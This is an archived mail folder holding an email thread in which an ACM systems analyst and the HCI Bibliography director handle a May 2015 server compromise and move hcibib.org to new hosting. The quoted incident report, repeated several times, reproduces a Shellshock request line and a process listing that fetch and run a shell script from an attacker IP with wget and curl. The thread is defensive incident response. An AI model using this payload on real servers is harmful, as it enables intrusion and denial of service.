# bug 

https://garyperlman.com/sigchi/perlman/mail/sent-mail-may-2015 # bug

From MAILER-DAEMON Mon May 11 15:56:52 2015
Date: 11 May 2015 15:56:52 -0400
From: Mail System Internal Data <MAILER-DAEMON@turing.acm.org>
Subject: DON'T DELETE THIS MESSAGE -- FOLDER INTERNAL DATA
X-IMAP: 1431374212 0000000000
Status: RO

This text is part of the internal format of your mail folder, and is not
a real message.  It is created automatically by the mail system software.
If deleted, important folder data will be lost, and it will be re-created
with the data reset to initial values.

From perlman@turing.acm.org Mon May 11 15:56:52 2015 -0400
Status: 
X-Status: 
X-Keywords:
Date: Mon, 11 May 2015 15:56:46 -0400 (EDT)
From: Gary PERLMAN <perlman@turing.acm.org>
To: Adam Greenberg <greenberg@hq.acm.org>
cc: Ken Bauer <kenbauer@acm.org>, ishelpdesk <ishelpdesk@hq.acm.org>
Subject: RE: hcibib.org website problem
In-Reply-To: <fexjkcj323dk2uk46n8iabre.1431180981595@email.android.com>
Message-ID: <Pine.LNX.4.64.1505111543100.27471@turing.acm.org>
References: <BN3PR0501MB123593A3CC77235DDD7190659FD00@BN3PR0501MB1235.namprd05.prod.outlook.com>
 <Pine.LNX.4.64.1505081848190.27144@turing.acm.org>
 <CY1PR0501MB1241687AF2DB723952BDC7B09FDD0@CY1PR0501MB1241.namprd05.prod.outlook.com>
 <Pine.LNX.4.64.1505090950260.4925@turing.acm.org>
 <CY1PR0501MB1241210170DEA120D155A6EF9FDD0@CY1PR0501MB1241.namprd05.prod.outlook.com>,<Pine.LNX.4.64.1505091010360.8767@turing.acm.org>
 <fexjkcj323dk2uk46n8iabre.1431180981595@email.android.com>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII; format=flowed

I'm getting close. I've transferred a lot of files over to perlman.hosting.acm.org
and have made good progress getting things working. I'd like to go live for just my IP:
 	24.48.90.117
and I'd like hcibib.org to point to:
 	/home/perlman/www/hcibib
I disabled some scripts I suspect of being vulnerable to a backdoor attack,
and I'm going to rework any before I activate them again.

I'd like a few days of testing before opening up hcibib.org from its new home.
I'd prefer that my old files on turing stick around for a while while I make sure
that I've gotten everything.

Gary

On Sat, 9 May 2015, Adam Greenberg wrote:

> Filezilla to Turing is either sftp or ftp server turing.acm.org  ports are standard 22 for sftp and 21 for ftp
>
>
>
> Thanks
> Adam
>
>
> -------- Original message --------
> From: Gary PERLMAN <perlman@turing.acm.org>
> Date: 05/09/2015 10:12 AM (GMT-05:00)
> To: Adam Greenberg <greenberg@hq.acm.org>
> Cc: Ken Bauer <kenbauer@acm.org>, ishelpdesk <ishelpdesk@hq.acm.org>
> Subject: RE: hcibib.org website problem
>
> File transfer via SSH keeps failing. Do you know what parameters I need to connect to turing with FileZilla?
>
> Gary
>
> On Sat, 9 May 2015, Adam Greenberg wrote:
>
>> Ok. Great.
>> Let us know if you need any assistance.
>>
>> Thanks
>> Adam
>>
>> -----Original Message-----
>> From: Gary PERLMAN [mailto:perlman@turing.acm.org]
>> Sent: Saturday, May 09, 2015 9:59 AM
>> To: Adam Greenberg
>> Cc: Ken Bauer; ishelpdesk
>> Subject: RE: hcibib.org website problem
>>
>> I am very sorry to have been unwittingly invovled in shutting down acm.org!
>>
>> I'm a little embarassed on this, but a move to a new hosting env has been "in the works" since at least last September, when I was given an acocunt (perlman.hosting.acm.org). At the time, I was overwhelmed by the task, but I think I can make progress.
>>
>> I will work on the file transfers today.
>>
>> Gary
>>
>> On Sat, 9 May 2015, Adam Greenberg wrote:
>>
>>> Ok.  What I would like to do then, is move you off of this old turing server and over to our newer hosting environment.
>>> Ishelpdesk is copied on this, I'm asking for us to open a ticket to get Gary Perlman setup on the new server, and all the files from the hcibib.org website synced over to the new server.
>>> Once Gary checks to make sure it works correctly we can cut DNS over.
>>> There are more filters and controls in place on the new environment, that would help mitigate the issue should it happen again.
>>> On the current server, this issue shut down this whole box, along with ACM's main website, because it tied up the resources of this server.
>>>
>>> Ishelpdesk, please proceed with getting an account setup for Gary, and setting it up to support the hcibib.org website.
>>>
>>> Thanks
>>> Adam
>>>
>>> -----Original Message-----
>>> From: Gary PERLMAN [mailto:perlman@turing.acm.org]
>>> Sent: Friday, May 08, 2015 6:50 PM
>>> To: Adam Greenberg
>>> Cc: Ken Bauer; ishelpdesk
>>> Subject: Re: hcibib.org website problem
>>>
>>> Well, I am stumped. I don't know what script was used for the attack, and if I did, I am not sure how I would prevent further attacks.
>>>
>>> Gary Perlman, Director, HCI Bibliography Project mailto:director@hcibib.org  http://hcibib.org/
>>>
>>> On Wed, 6 May 2015, Adam Greenberg wrote:
>>>
>>>> Hello Gary,
>>>> I had to take the hcibib.org website offline tonight.   The site was used to execute a denial of service attack that took down the server.
>>>> Here is the reference from the hcibib.org weblogs
>>>>
>>>> 62.75.145.250 - - [06/May/2015:12:12:39 -0400] "GET / HTTP/1.1" 200 10740 "-" "() { :; }; /bin/bash -c 'rm -rf /tmp/dd.sh /tmp/dd1.sh;wget http://62.75.145.250/dd.sh -O /tmp/dd.sh;curl http://62.75.145.250/dd.sh -o /tmp/dd1.sh;sh /tmp/dd.sh & sh /tmp/dd1.sh 0>&1'"
>>>>
>>>> I put the entire weblog for today to your /home/Perlman
>>>>
>>>> The request executed a denial of service attack that started this.
>>>> apache   28593     1  0 12:12 ?        00:00:00 /bin/bash -c rm -rf /tmp/dd.sh /tmp/dd1.sh;wget http://62.75.145.250/dd.sh -O /tmp/dd.sh;curl http://62.75.145.250/dd.sh -o /tmp/dd1.sh;sh /tmp/dd.sh & sh /tmp/dd1.sh 0>&1
>>>>
>>>> Attached is a sample of what was running on the server.
>>>>
>>>> I have changed the default document root of the website until I hear from you.  I would prefer to bring the site back online restricted to the IP address that you will be connecting from so that you have time to properly examine you site and then we can open it back up.  Please let me know the IP address you will be connecting from and I will make the appropriate configuration changes.
>>>>
>>>> Thanks
>>>> Adam
>>>>
>>>>
>>>> Adam Greenberg
>>>> Senior Systems Analyst
>>>> Association for Computing Machinery
>>>> 2 Penn Plaza
>>>> Suite 701
>>>> New York, NY 10121
>>>> Office: 212-626-0573
>>>> greenberg@acm.org
>>>>
>>>>
>>>
>>>
>>
>>
>
> --
>

-- 

From perlman@turing.acm.org Mon May 11 22:18:31 2015 -0400
Status: 
X-Status: 
X-Keywords:
Date: Mon, 11 May 2015 22:18:31 -0400 (EDT)
From: Gary PERLMAN <perlman@turing.acm.org>
To: Adam Greenberg <greenberg@hq.acm.org>
cc: Ken Bauer <kenbauer@acm.org>, ishelpdesk <ishelpdesk@hq.acm.org>
Subject: RE: hcibib.org website problem
In-Reply-To: <CY1PR0501MB124193B6E14A9A151A7F45099FDB0@CY1PR0501MB1241.namprd05.prod.outlook.com>
Message-ID: <Pine.LNX.4.64.1505112215160.2935@turing.acm.org>
References: <BN3PR0501MB123593A3CC77235DDD7190659FD00@BN3PR0501MB1235.namprd05.prod.outlook.com>
 <Pine.LNX.4.64.1505081848190.27144@turing.acm.org>
 <CY1PR0501MB1241687AF2DB723952BDC7B09FDD0@CY1PR0501MB1241.namprd05.prod.outlook.com>
 <Pine.LNX.4.64.1505090950260.4925@turing.acm.org>
 <CY1PR0501MB1241210170DEA120D155A6EF9FDD0@CY1PR0501MB1241.namprd05.prod.outlook.com>,<Pine.LNX.4.64.1505091010360.8767@turing.acm.org>
 <fexjkcj323dk2uk46n8iabre.1431180981595@email.android.com>
 <Pine.LNX.4.64.1505111543100.27471@turing.acm.org>
 <CY1PR0501MB124193B6E14A9A151A7F45099FDB0@CY1PR0501MB1241.namprd05.prod.outlook.com>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII; format=flowed

Thanks, Adam,

I did the local hosts change and fixed the default index file so you don't need the index.html.

I will work on getting things working this week.

Gary

On Mon, 11 May 2015, Adam Greenberg wrote:

> Gary,
> I fixed the hosting for you.  If you look in cpanel under "Add On Domains"
> I added hcibib.org and mapped it with a document root of  /public_html/hcibib/
>
> If you add this entry to your local hosts file
> 216.119.136.18 hcibib.org
> You can hit the site as hcibib.org without us modifying any DNS entries and opening it up right now.
>
> http://hcibib.org/index.html
>
> Once you think it's ready to go, let me know and I can change the DNS entries.
>
> We can leave the files in place on turing for now., that's not a problem.
>
> Thanks
> Adam
>
> -----Original Message-----
> From: Gary PERLMAN [mailto:perlman@turing.acm.org]
> Sent: Monday, May 11, 2015 3:57 PM
> To: Adam Greenberg
> Cc: Ken Bauer; ishelpdesk
> Subject: RE: hcibib.org website problem
>
> I'm getting close. I've transferred a lot of files over to perlman.hosting.acm.org and have made good progress getting things working. I'd like to go live for just my IP:
> 	24.48.90.117
> and I'd like hcibib.org to point to:
> 	/home/perlman/www/hcibib
> I disabled some scripts I suspect of being vulnerable to a backdoor attack, and I'm going to rework any before I activate them again.
>
> I'd like a few days of testing before opening up hcibib.org from its new home.
> I'd prefer that my old files on turing stick around for a while while I make sure that I've gotten everything.
>
> Gary
>
> On Sat, 9 May 2015, Adam Greenberg wrote:
>
>> Filezilla to Turing is either sftp or ftp server turing.acm.org  ports
>> are standard 22 for sftp and 21 for ftp
>>
>>
>>
>> Thanks
>> Adam
>>
>>
>> -------- Original message --------
>> From: Gary PERLMAN <perlman@turing.acm.org>
>> Date: 05/09/2015 10:12 AM (GMT-05:00)
>> To: Adam Greenberg <greenberg@hq.acm.org>
>> Cc: Ken Bauer <kenbauer@acm.org>, ishelpdesk <ishelpdesk@hq.acm.org>
>> Subject: RE: hcibib.org website problem
>>
>> File transfer via SSH keeps failing. Do you know what parameters I need to connect to turing with FileZilla?
>>
>> Gary
>>
>> On Sat, 9 May 2015, Adam Greenberg wrote:
>>
>>> Ok. Great.
>>> Let us know if you need any assistance.
>>>
>>> Thanks
>>> Adam
>>>
>>> -----Original Message-----
>>> From: Gary PERLMAN [mailto:perlman@turing.acm.org]
>>> Sent: Saturday, May 09, 2015 9:59 AM
>>> To: Adam Greenberg
>>> Cc: Ken Bauer; ishelpdesk
>>> Subject: RE: hcibib.org website problem
>>>
>>> I am very sorry to have been unwittingly invovled in shutting down acm.org!
>>>
>>> I'm a little embarassed on this, but a move to a new hosting env has been "in the works" since at least last September, when I was given an acocunt (perlman.hosting.acm.org). At the time, I was overwhelmed by the task, but I think I can make progress.
>>>
>>> I will work on the file transfers today.
>>>
>>> Gary
>>>
>>> On Sat, 9 May 2015, Adam Greenberg wrote:
>>>
>>>> Ok.  What I would like to do then, is move you off of this old turing server and over to our newer hosting environment.
>>>> Ishelpdesk is copied on this, I'm asking for us to open a ticket to get Gary Perlman setup on the new server, and all the files from the hcibib.org website synced over to the new server.
>>>> Once Gary checks to make sure it works correctly we can cut DNS over.
>>>> There are more filters and controls in place on the new environment, that would help mitigate the issue should it happen again.
>>>> On the current server, this issue shut down this whole box, along with ACM's main website, because it tied up the resources of this server.
>>>>
>>>> Ishelpdesk, please proceed with getting an account setup for Gary, and setting it up to support the hcibib.org website.
>>>>
>>>> Thanks
>>>> Adam
>>>>
>>>> -----Original Message-----
>>>> From: Gary PERLMAN [mailto:perlman@turing.acm.org]
>>>> Sent: Friday, May 08, 2015 6:50 PM
>>>> To: Adam Greenberg
>>>> Cc: Ken Bauer; ishelpdesk
>>>> Subject: Re: hcibib.org website problem
>>>>
>>>> Well, I am stumped. I don't know what script was used for the attack, and if I did, I am not sure how I would prevent further attacks.
>>>>
>>>> Gary Perlman, Director, HCI Bibliography Project
>>>> mailto:director@hcibib.org  http://hcibib.org/
>>>>
>>>> On Wed, 6 May 2015, Adam Greenberg wrote:
>>>>
>>>>> Hello Gary,
>>>>> I had to take the hcibib.org website offline tonight.   The site was used to execute a denial of service attack that took down the server.
>>>>> Here is the reference from the hcibib.org weblogs
>>>>>
>>>>> 62.75.145.250 - - [06/May/2015:12:12:39 -0400] "GET / HTTP/1.1" 200 10740 "-" "() { :; }; /bin/bash -c 'rm -rf /tmp/dd.sh /tmp/dd1.sh;wget http://62.75.145.250/dd.sh -O /tmp/dd.sh;curl http://62.75.145.250/dd.sh -o /tmp/dd1.sh;sh /tmp/dd.sh & sh /tmp/dd1.sh 0>&1'"
>>>>>
>>>>> I put the entire weblog for today to your /home/Perlman
>>>>>
>>>>> The request executed a denial of service attack that started this.
>>>>> apache   28593     1  0 12:12 ?        00:00:00 /bin/bash -c rm -rf /tmp/dd.sh /tmp/dd1.sh;wget http://62.75.145.250/dd.sh -O /tmp/dd.sh;curl http://62.75.145.250/dd.sh -o /tmp/dd1.sh;sh /tmp/dd.sh & sh /tmp/dd1.sh 0>&1
>>>>>
>>>>> Attached is a sample of what was running on the server.
>>>>>
>>>>> I have changed the default document root of the website until I hear from you.  I would prefer to bring the site back online restricted to the IP address that you will be connecting from so that you have time to properly examine you site and then we can open it back up.  Please let me know the IP address you will be connecting from and I will make the appropriate configuration changes.
>>>>>
>>>>> Thanks
>>>>> Adam
>>>>>
>>>>>
>>>>> Adam Greenberg
>>>>> Senior Systems Analyst
>>>>> Association for Computing Machinery
>>>>> 2 Penn Plaza
>>>>> Suite 701
>>>>> New York, NY 10121
>>>>> Office: 212-626-0573
>>>>> greenberg@acm.org
>>>>>
>>>>>
>>>>
>>>>
>>>
>>>
>>
>> --
>>
>
>

-- 

From perlman@turing.acm.org Wed May 13 09:32:21 2015 -0400
Status: 
X-Status: 
X-Keywords:
Date: Wed, 13 May 2015 09:32:21 -0400 (EDT)
From: Gary PERLMAN <perlman@turing.acm.org>
To: Adam Greenberg <greenberg@hq.acm.org>
cc: Ken Bauer <kenbauer@acm.org>, ishelpdesk <ishelpdesk@hq.acm.org>
Subject: RE: hcibib.org website problem
In-Reply-To: <CY1PR0501MB124193B6E14A9A151A7F45099FDB0@CY1PR0501MB1241.namprd05.prod.outlook.com>
Message-ID: <Pine.LNX.4.64.1505130930040.2938@turing.acm.org>
References: <BN3PR0501MB123593A3CC77235DDD7190659FD00@BN3PR0501MB1235.namprd05.prod.outlook.com>
 <Pine.LNX.4.64.1505081848190.27144@turing.acm.org>
 <CY1PR0501MB1241687AF2DB723952BDC7B09FDD0@CY1PR0501MB1241.namprd05.prod.outlook.com>
 <Pine.LNX.4.64.1505090950260.4925@turing.acm.org>
 <CY1PR0501MB1241210170DEA120D155A6EF9FDD0@CY1PR0501MB1241.namprd05.prod.outlook.com>,<Pine.LNX.4.64.1505091010360.8767@turing.acm.org>
 <fexjkcj323dk2uk46n8iabre.1431180981595@email.android.com>
 <Pine.LNX.4.64.1505111543100.27471@turing.acm.org>
 <CY1PR0501MB124193B6E14A9A151A7F45099FDB0@CY1PR0501MB1241.namprd05.prod.outlook.com>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII; format=flowed

I'm ready to go live. I still have some things to fix,
but the core funcitonlaity is working.

Gary

On Mon, 11 May 2015, Adam Greenberg wrote:

> Gary,
> I fixed the hosting for you.  If you look in cpanel under "Add On Domains"
> I added hcibib.org and mapped it with a document root of  /public_html/hcibib/
>
> If you add this entry to your local hosts file
> 216.119.136.18 hcibib.org
> You can hit the site as hcibib.org without us modifying any DNS entries and opening it up right now.
>
> http://hcibib.org/index.html
>
> Once you think it's ready to go, let me know and I can change the DNS entries.
>
> We can leave the files in place on turing for now., that's not a problem.
>
> Thanks
> Adam
>
> -----Original Message-----
> From: Gary PERLMAN [mailto:perlman@turing.acm.org]
> Sent: Monday, May 11, 2015 3:57 PM
> To: Adam Greenberg
> Cc: Ken Bauer; ishelpdesk
> Subject: RE: hcibib.org website problem
>
> I'm getting close. I've transferred a lot of files over to perlman.hosting.acm.org and have made good progress getting things working. I'd like to go live for just my IP:
> 	24.48.90.117
> and I'd like hcibib.org to point to:
> 	/home/perlman/www/hcibib
> I disabled some scripts I suspect of being vulnerable to a backdoor attack, and I'm going to rework any before I activate them again.
>
> I'd like a few days of testing before opening up hcibib.org from its new home.
> I'd prefer that my old files on turing stick around for a while while I make sure that I've gotten everything.
>
> Gary
>
> On Sat, 9 May 2015, Adam Greenberg wrote:
>
>> Filezilla to Turing is either sftp or ftp server turing.acm.org  ports
>> are standard 22 for sftp and 21 for ftp
>>
>>
>>
>> Thanks
>> Adam
>>
>>
>> -------- Original message --------
>> From: Gary PERLMAN <perlman@turing.acm.org>
>> Date: 05/09/2015 10:12 AM (GMT-05:00)
>> To: Adam Greenberg <greenberg@hq.acm.org>
>> Cc: Ken Bauer <kenbauer@acm.org>, ishelpdesk <ishelpdesk@hq.acm.org>
>> Subject: RE: hcibib.org website problem
>>
>> File transfer via SSH keeps failing. Do you know what parameters I need to connect to turing with FileZilla?
>>
>> Gary
>>
>> On Sat, 9 May 2015, Adam Greenberg wrote:
>>
>>> Ok. Great.
>>> Let us know if you need any assistance.
>>>
>>> Thanks
>>> Adam
>>>
>>> -----Original Message-----
>>> From: Gary PERLMAN [mailto:perlman@turing.acm.org]
>>> Sent: Saturday, May 09, 2015 9:59 AM
>>> To: Adam Greenberg
>>> Cc: Ken Bauer; ishelpdesk
>>> Subject: RE: hcibib.org website problem
>>>
>>> I am very sorry to have been unwittingly invovled in shutting down acm.org!
>>>
>>> I'm a little embarassed on this, but a move to a new hosting env has been "in the works" since at least last September, when I was given an acocunt (perlman.hosting.acm.org). At the time, I was overwhelmed by the task, but I think I can make progress.
>>>
>>> I will work on the file transfers today.
>>>
>>> Gary
>>>
>>> On Sat, 9 May 2015, Adam Greenberg wrote:
>>>
>>>> Ok.  What I would like to do then, is move you off of this old turing server and over to our newer hosting environment.
>>>> Ishelpdesk is copied on this, I'm asking for us to open a ticket to get Gary Perlman setup on the new server, and all the files from the hcibib.org website synced over to the new server.
>>>> Once Gary checks to make sure it works correctly we can cut DNS over.
>>>> There are more filters and controls in place on the new environment, that would help mitigate the issue should it happen again.
>>>> On the current server, this issue shut down this whole box, along with ACM's main website, because it tied up the resources of this server.
>>>>
>>>> Ishelpdesk, please proceed with getting an account setup for Gary, and setting it up to support the hcibib.org website.
>>>>
>>>> Thanks
>>>> Adam
>>>>
>>>> -----Original Message-----
>>>> From: Gary PERLMAN [mailto:perlman@turing.acm.org]
>>>> Sent: Friday, May 08, 2015 6:50 PM
>>>> To: Adam Greenberg
>>>> Cc: Ken Bauer; ishelpdesk
>>>> Subject: Re: hcibib.org website problem
>>>>
>>>> Well, I am stumped. I don't know what script was used for the attack, and if I did, I am not sure how I would prevent further attacks.
>>>>
>>>> Gary Perlman, Director, HCI Bibliography Project
>>>> mailto:director@hcibib.org  http://hcibib.org/
>>>>
>>>> On Wed, 6 May 2015, Adam Greenberg wrote:
>>>>
>>>>> Hello Gary,
>>>>> I had to take the hcibib.org website offline tonight.   The site was used to execute a denial of service attack that took down the server.
>>>>> Here is the reference from the hcibib.org weblogs
>>>>>
>>>>> 62.75.145.250 - - [06/May/2015:12:12:39 -0400] "GET / HTTP/1.1" 200 10740 "-" "() { :; }; /bin/bash -c 'rm -rf /tmp/dd.sh /tmp/dd1.sh;wget http://62.75.145.250/dd.sh -O /tmp/dd.sh;curl http://62.75.145.250/dd.sh -o /tmp/dd1.sh;sh /tmp/dd.sh & sh /tmp/dd1.sh 0>&1'"
>>>>>
>>>>> I put the entire weblog for today to your /home/Perlman
>>>>>
>>>>> The request executed a denial of service attack that started this.
>>>>> apache   28593     1  0 12:12 ?        00:00:00 /bin/bash -c rm -rf /tmp/dd.sh /tmp/dd1.sh;wget http://62.75.145.250/dd.sh -O /tmp/dd.sh;curl http://62.75.145.250/dd.sh -o /tmp/dd1.sh;sh /tmp/dd.sh & sh /tmp/dd1.sh 0>&1
>>>>>
>>>>> Attached is a sample of what was running on the server.
>>>>>
>>>>> I have changed the default document root of the website until I hear from you.  I would prefer to bring the site back online restricted to the IP address that you will be connecting from so that you have time to properly examine you site and then we can open it back up.  Please let me know the IP address you will be connecting from and I will make the appropriate configuration changes.
>>>>>
>>>>> Thanks
>>>>> Adam
>>>>>
>>>>>
>>>>> Adam Greenberg
>>>>> Senior Systems Analyst
>>>>> Association for Computing Machinery
>>>>> 2 Penn Plaza
>>>>> Suite 701
>>>>> New York, NY 10121
>>>>> Office: 212-626-0573
>>>>> greenberg@acm.org
>>>>>
>>>>>
>>>>
>>>>
>>>
>>>
>>
>> --
>>
>
>

-- 

From perlman@turing.acm.org Wed May 13 10:30:59 2015 -0400
Status: 
X-Status: 
X-Keywords:
Date: Wed, 13 May 2015 10:30:59 -0400 (EDT)
From: Gary PERLMAN <perlman@turing.acm.org>
To: Adam Greenberg <greenberg@hq.acm.org>
cc: Ken Bauer <kenbauer@acm.org>, ishelpdesk <ishelpdesk@hq.acm.org>
Subject: RE: hcibib.org website problem
In-Reply-To: <CY1PR0501MB124146AD61549F83EA0C3FAC9FD90@CY1PR0501MB1241.namprd05.prod.outlook.com>
Message-ID: <Pine.LNX.4.64.1505131024550.12137@turing.acm.org>
References: <BN3PR0501MB123593A3CC77235DDD7190659FD00@BN3PR0501MB1235.namprd05.prod.outlook.com>
 <Pine.LNX.4.64.1505081848190.27144@turing.acm.org>
 <CY1PR0501MB1241687AF2DB723952BDC7B09FDD0@CY1PR0501MB1241.namprd05.prod.outlook.com>
 <Pine.LNX.4.64.1505090950260.4925@turing.acm.org>
 <CY1PR0501MB1241210170DEA120D155A6EF9FDD0@CY1PR0501MB1241.namprd05.prod.outlook.com>,<Pine.LNX.4.64.1505091010360.8767@turing.acm.org>
 <fexjkcj323dk2uk46n8iabre.1431180981595@email.android.com>
 <Pine.LNX.4.64.1505111543100.27471@turing.acm.org>
 <CY1PR0501MB124193B6E14A9A151A7F45099FDB0@CY1PR0501MB1241.namprd05.prod.outlook.com>
 <Pine.LNX.4.64.1505130930040.2938@turing.acm.org>
 <CY1PR0501MB124146AD61549F83EA0C3FAC9FD90@CY1PR0501MB1241.namprd05.prod.outlook.com>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII; format=flowed

Thanks, Adam,

I too have the same question about the email, but I don't have an answer.

I'm quite familiar with the email options in cpanel. I think I can handle the mail forwarding for hcibib.org and will update my @acm.org address.

Gary

On Wed, 13 May 2015, Adam Greenberg wrote:

> Gary,
> I made the DNS changes for the website.
>
> One question, what would you like to do about the email?
>
> Do you have a gmail address you would like us to point the domain to?  And the mail for the @acm.org address that you have going to perlman@turing.acm.org?
> You can use the email functionality within the Perlman.hosting.acm.org account.  It's configurable in cpanel.
>
> Let me know.
>
> Thanks
> Adam
>
>
> -----Original Message-----
> From: Gary PERLMAN [mailto:perlman@turing.acm.org]
> Sent: Wednesday, May 13, 2015 9:32 AM
> To: Adam Greenberg
> Cc: Ken Bauer; ishelpdesk
> Subject: RE: hcibib.org website problem
>
> I'm ready to go live. I still have some things to fix, but the core funcitonlaity is working.
>
> Gary
>
> On Mon, 11 May 2015, Adam Greenberg wrote:
>
>> Gary,
>> I fixed the hosting for you.  If you look in cpanel under "Add On Domains"
>> I added hcibib.org and mapped it with a document root of
>> /public_html/hcibib/
>>
>> If you add this entry to your local hosts file
>> 216.119.136.18 hcibib.org
>> You can hit the site as hcibib.org without us modifying any DNS entries and opening it up right now.
>>
>> http://hcibib.org/index.html
>>
>> Once you think it's ready to go, let me know and I can change the DNS entries.
>>
>> We can leave the files in place on turing for now., that's not a problem.
>>
>> Thanks
>> Adam
>>
>> -----Original Message-----
>> From: Gary PERLMAN [mailto:perlman@turing.acm.org]
>> Sent: Monday, May 11, 2015 3:57 PM
>> To: Adam Greenberg
>> Cc: Ken Bauer; ishelpdesk
>> Subject: RE: hcibib.org website problem
>>
>> I'm getting close. I've transferred a lot of files over to perlman.hosting.acm.org and have made good progress getting things working. I'd like to go live for just my IP:
>> 	24.48.90.117
>> and I'd like hcibib.org to point to:
>> 	/home/perlman/www/hcibib
>> I disabled some scripts I suspect of being vulnerable to a backdoor attack, and I'm going to rework any before I activate them again.
>>
>> I'd like a few days of testing before opening up hcibib.org from its new home.
>> I'd prefer that my old files on turing stick around for a while while I make sure that I've gotten everything.
>>
>> Gary
>>
>> On Sat, 9 May 2015, Adam Greenberg wrote:
>>
>>> Filezilla to Turing is either sftp or ftp server turing.acm.org
>>> ports are standard 22 for sftp and 21 for ftp
>>>
>>>
>>>
>>> Thanks
>>> Adam
>>>
>>>
>>> -------- Original message --------
>>> From: Gary PERLMAN <perlman@turing.acm.org>
>>> Date: 05/09/2015 10:12 AM (GMT-05:00)
>>> To: Adam Greenberg <greenberg@hq.acm.org>
>>> Cc: Ken Bauer <kenbauer@acm.org>, ishelpdesk <ishelpdesk@hq.acm.org>
>>> Subject: RE: hcibib.org website problem
>>>
>>> File transfer via SSH keeps failing. Do you know what parameters I need to connect to turing with FileZilla?
>>>
>>> Gary
>>>
>>> On Sat, 9 May 2015, Adam Greenberg wrote:
>>>
>>>> Ok. Great.
>>>> Let us know if you need any assistance.
>>>>
>>>> Thanks
>>>> Adam
>>>>
>>>> -----Original Message-----
>>>> From: Gary PERLMAN [mailto:perlman@turing.acm.org]
>>>> Sent: Saturday, May 09, 2015 9:59 AM
>>>> To: Adam Greenberg
>>>> Cc: Ken Bauer; ishelpdesk
>>>> Subject: RE: hcibib.org website problem
>>>>
>>>> I am very sorry to have been unwittingly invovled in shutting down acm.org!
>>>>
>>>> I'm a little embarassed on this, but a move to a new hosting env has been "in the works" since at least last September, when I was given an acocunt (perlman.hosting.acm.org). At the time, I was overwhelmed by the task, but I think I can make progress.
>>>>
>>>> I will work on the file transfers today.
>>>>
>>>> Gary
>>>>
>>>> On Sat, 9 May 2015, Adam Greenberg wrote:
>>>>
>>>>> Ok.  What I would like to do then, is move you off of this old turing server and over to our newer hosting environment.
>>>>> Ishelpdesk is copied on this, I'm asking for us to open a ticket to get Gary Perlman setup on the new server, and all the files from the hcibib.org website synced over to the new server.
>>>>> Once Gary checks to make sure it works correctly we can cut DNS over.
>>>>> There are more filters and controls in place on the new environment, that would help mitigate the issue should it happen again.
>>>>> On the current server, this issue shut down this whole box, along with ACM's main website, because it tied up the resources of this server.
>>>>>
>>>>> Ishelpdesk, please proceed with getting an account setup for Gary, and setting it up to support the hcibib.org website.
>>>>>
>>>>> Thanks
>>>>> Adam
>>>>>
>>>>> -----Original Message-----
>>>>> From: Gary PERLMAN [mailto:perlman@turing.acm.org]
>>>>> Sent: Friday, May 08, 2015 6:50 PM
>>>>> To: Adam Greenberg
>>>>> Cc: Ken Bauer; ishelpdesk
>>>>> Subject: Re: hcibib.org website problem
>>>>>
>>>>> Well, I am stumped. I don't know what script was used for the attack, and if I did, I am not sure how I would prevent further attacks.
>>>>>
>>>>> Gary Perlman, Director, HCI Bibliography Project
>>>>> mailto:director@hcibib.org  http://hcibib.org/
>>>>>
>>>>> On Wed, 6 May 2015, Adam Greenberg wrote:
>>>>>
>>>>>> Hello Gary,
>>>>>> I had to take the hcibib.org website offline tonight.   The site was used to execute a denial of service attack that took down the server.
>>>>>> Here is the reference from the hcibib.org weblogs
>>>>>>
>>>>>> 62.75.145.250 - - [06/May/2015:12:12:39 -0400] "GET / HTTP/1.1" 200 10740 "-" "() { :; }; /bin/bash -c 'rm -rf /tmp/dd.sh /tmp/dd1.sh;wget http://62.75.145.250/dd.sh -O /tmp/dd.sh;curl http://62.75.145.250/dd.sh -o /tmp/dd1.sh;sh /tmp/dd.sh & sh /tmp/dd1.sh 0>&1'"
>>>>>>
>>>>>> I put the entire weblog for today to your /home/Perlman
>>>>>>
>>>>>> The request executed a denial of service attack that started this.
>>>>>> apache   28593     1  0 12:12 ?        00:00:00 /bin/bash -c rm -rf /tmp/dd.sh /tmp/dd1.sh;wget http://62.75.145.250/dd.sh -O /tmp/dd.sh;curl http://62.75.145.250/dd.sh -o /tmp/dd1.sh;sh /tmp/dd.sh & sh /tmp/dd1.sh 0>&1
>>>>>>
>>>>>> Attached is a sample of what was running on the server.
>>>>>>
>>>>>> I have changed the default document root of the website until I hear from you.  I would prefer to bring the site back online restricted to the IP address that you will be connecting from so that you have time to properly examine you site and then we can open it back up.  Please let me know the IP address you will be connecting from and I will make the appropriate configuration changes.
>>>>>>
>>>>>> Thanks
>>>>>> Adam
>>>>>>
>>>>>>
>>>>>> Adam Greenberg
>>>>>> Senior Systems Analyst
>>>>>> Association for Computing Machinery
>>>>>> 2 Penn Plaza
>>>>>> Suite 701
>>>>>> New York, NY 10121
>>>>>> Office: 212-626-0573
>>>>>> greenberg@acm.org
>>>>>>
>>>>>>
>>>>>
>>>>>
>>>>
>>>>
>>>
>>> --
>>>
>>
>>
>
>

-- 

From perlman@turing.acm.org Wed May 13 11:08:39 2015 -0400
Status: 
X-Status: 
X-Keywords:
Date: Wed, 13 May 2015 11:08:39 -0400 (EDT)
From: Gary PERLMAN <perlman@turing.acm.org>
To: Adam Greenberg <greenberg@hq.acm.org>
Subject: RE: hcibib.org website problem
In-Reply-To: <CY1PR0501MB1241BBE5DF5F9F680D707FA99FD90@CY1PR0501MB1241.namprd05.prod.outlook.com>
Message-ID: <Pine.LNX.4.64.1505131103100.18729@turing.acm.org>
References: <BN3PR0501MB123593A3CC77235DDD7190659FD00@BN3PR0501MB1235.namprd05.prod.outlook.com>
 <Pine.LNX.4.64.1505081848190.27144@turing.acm.org>
 <CY1PR0501MB1241687AF2DB723952BDC7B09FDD0@CY1PR0501MB1241.namprd05.prod.outlook.com>
 <Pine.LNX.4.64.1505090950260.4925@turing.acm.org>
 <CY1PR0501MB1241210170DEA120D155A6EF9FDD0@CY1PR0501MB1241.namprd05.prod.outlook.com>,<Pine.LNX.4.64.1505091010360.8767@turing.acm.org>
 <fexjkcj323dk2uk46n8iabre.1431180981595@email.android.com>
 <Pine.LNX.4.64.1505111543100.27471@turing.acm.org>
 <CY1PR0501MB124193B6E14A9A151A7F45099FDB0@CY1PR0501MB1241.namprd05.prod.outlook.com>
 <Pine.LNX.4.64.1505130930040.2938@turing.acm.org>
